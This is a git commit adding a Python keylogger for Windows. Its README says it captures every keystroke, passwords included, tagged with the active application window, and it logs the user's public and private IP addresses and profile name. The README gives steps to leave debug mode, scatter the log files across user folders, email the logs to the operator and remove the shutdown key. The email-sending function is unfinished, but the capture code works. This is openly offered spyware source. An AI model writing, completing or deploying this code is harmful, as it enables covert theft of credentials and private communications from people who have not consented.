ba66c573c8929812cf3eafa8ec78eba5af36591a
Mazz <kmazzone93@gmail.com>
2023-02-09 01:06:31 -0500

    Add files via upload

---
+++ KL0Gg3R.py
@@ -0,0 +1,175 @@
+"""
+MIT License
+
+Copyright (c) 2023 MazZ
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+"""
+'''
+TODO: 
+Finish send_logs(): Sends logs to specified email instead of storing on disk.
+'''
+'''=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-K3yL0G.py README-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+# K3yL0G.py records user application activity, and the user's keystrokes corresponding to that application.
+# This program will record sensitive data such as passwords, emails, phone numbers. EVERYTHING that the user
+types is stored in the logs.txt file, or emailed to the administer of 'K3yL0G.py'.
+# K3yL0G.py is initially setup to run in 'DEBUG' mode. Which outputs the keys pressed, to the console and stores the data
+to 'Logs.txt' in the debug DIR on disk, rather than emailing the administer. This is to help minimize 
+damage from script kiddies. While in Debug Mode 'K3yL0G.py' can be shut down with 'HOME' key.
+# I assume whoever is running this script possesses the knowledge to take it out of debug mode. Here is a quick Tut:
+    # Under the write_file() function; Change dirList = [debug] >> dirList  = [one, two, three] 
+    # Change the TO:/FROM: email vars to your own email. (Must be setup with google API)
+    # Run send_logs() function >> __name__ == '__main__'  (Above the Listener)
+    # OPTIONAL: Remove/modify the if statement under on_press() function that shuts down K3yL0G.py with 'HOME' key.
+'''
+from pynput.keyboard import Key, Listener
+import win32gui
+import random
+import requests
+import socket
+import time
+import os
+
+# Log Banner Info
+pubIP = requests.get('https://api.ipify.org').text  # Grabs Public IP from ipify API
+privIP = socket.gethostbyname(socket.gethostname())  # Grabs Private Network Address
+user = os.path.expanduser('~').split('\\')[2]  # Grabs user path
+datetime = time.ctime(time.time())  # Current Date/Time
+
+# Banner
+msg = f"[START OF LOGS]\n ~* Date/Time: {datetime}\n ~* User-Profile: {user}\n ~* Public IP: {pubIP}\n " \
+      f"~* Private IP: {privIP}\n"
+
+# STORED DATA
+log_data = [msg]
+
+oldApp = ''
+d_file = []
+
+key_count = 0
+keys = []
+
+
+# Defines What to do/listen for on each key press
+def on_press(key):
+    global oldApp, key_count
+
+    # Grabs Name from window of Active Application that the user is using.
+    app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+    # Cortana == Win start menu
+    if app == 'Cortana':
+        app = 'Windows Start Menu'
+    else:
+        pass
+
+    # Logs Application Info.
+    if app != oldApp and app != '':
+        log_data.append(f"\n\n[{datetime}] ~ {app}\n")
+        oldApp = app
+    else:
+        pass
+
+    # List of keys to substitute
+    sub_list = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
+                'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
+                'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '', '\\x13',
+                '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
+                '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
+
+    # Cleans output of key and counts keystrokes.
+    key = str(key).strip('\'')
+    key_count += 1
+    print(key)  # For debugging only
+
+    # Sub_list Example: 'Key.enter' == [ENTER]\n
+    if key in sub_list:
+        log_data.append(sub_list[sub_list.index(key) + 1])
+    else:
+        log_data.append(key)
+
+    # Ensures that every keystroke is written to the logs.txt - DEBUG MODE ONLY!
+    if key_count > 1:
+        key_count = 0
+        write_file()
+
+
+# Function that Writes Key Logs to file(s)
+def write_file():
+    # Directories to save log file(s)
+    # one = os.path.expanduser('~') + '/Documents/'
+    # two = os.path.expanduser('~') + '/Pictures/'
+    # three = os.path.expanduser('~') + '/******/' - Add another DIR
+    debug = os.path.expanduser('~') + '/Documents/GitHub/Python/Random Projects/keyloggers/'
+
+    # List of directories to move temp stored log file between. (Only use when emailing logs)
+    dirList = [debug]
+
+    # Changes directories/filename of the log each time it is written. (Turned off until email is working.)
+    filepath = random.choice(dirList)
+    filename = 'Logs.txt'  # str(count) + 'I' + str(random.randint(100000, 999999)) + '.txt' -For when send_file() works
+    file = filepath + filename
+    d_file.append(file)
+
+    # Writes Data to logs
+    with open(file, 'w') as fp:
+        for key in log_data:
+            k = str(key).replace("'", "")
+            #  Comment out "Key.space, ' '," in sublist for every word typed to be on a new line.
+            if k.find("space") > 0:
+                fp.write("\n")
+            elif k.find("Key") == -1:
+                fp.write(k)
+        # fp.write(''.join(log_data))
+    # print('Data Written to Logs.txt...') # Debugging
+
+
+# Shutdown Key - DEBUG ONLY
+def on_release(key):
+    if key == Key.home:
+        return False
+
+
+# CURRENT WIP - Will send log file to specified email, instead of storing on disk. Google API is currently being a bitch
+def send_logs():
+    count = 0
+    MIN = 10
+    SECS = 60
+    # time.sleep(MIN * SECONDS) # Sends email every 10min
+    time.sleep(30)  # Ever 30s for debugging
+    while True:
+        if len(log_data) > 1:
+            try:
+                write_file()
+                os.remove(d_file[0])
+                del log_data[1:]
+                del d_file[0:]
+                print('Deleted data/files')  # DEBUG MODE ONLY
+
+                count += 1
+
+            except Exception as errorString:
+                print('[!] logs // Error.. ~ %s' % errorString)
+                pass
+
+
+# Start Listener
+if __name__ == '__main__':
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
